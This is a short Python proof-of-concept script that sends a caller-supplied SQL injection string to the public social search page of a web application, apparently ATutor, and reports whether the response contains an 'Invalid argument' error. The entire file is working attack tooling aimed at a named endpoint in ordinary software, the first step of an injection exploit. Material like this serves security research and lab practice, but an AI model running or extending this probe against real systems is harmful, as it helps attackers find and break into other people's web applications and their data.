import sys
import re
import requests
from bs4 import BeautifulSoup


# python poc1.py localhost:8000 AAAA'

def searchFriends_sqli(ip, inj_str):
    target = f"http://{ip}/mods/_standard/social/index_public.php?q={inj_str}"
    r = requests.get(target)
    s = BeautifulSoup(r.text, 'lxml')
    print("Response Headers:")
    print(r.headers)
    print()
    print("Response Content:")
    print(s.text)
    print()
    error = re.search("Invalid argument", s.text)
    if error:
        print("Errors found in response. Possible SQL injection)found")
    else:
        print("No errors found")


def main():
    if len(sys.argv) != 3:
        print(f"(+) usage: {sys.argv[0]} <target> <injection_string>")
        print(f'(+) eg: {sys.argv[0]} 192.168.121.103 "aaaa\'" ')
        sys.exit(-1)
    ip = sys.argv[1]
    injection_string = sys.argv[2]
    searchFriends_sqli(ip, injection_string)


if __name__ == "__main__":
    main()
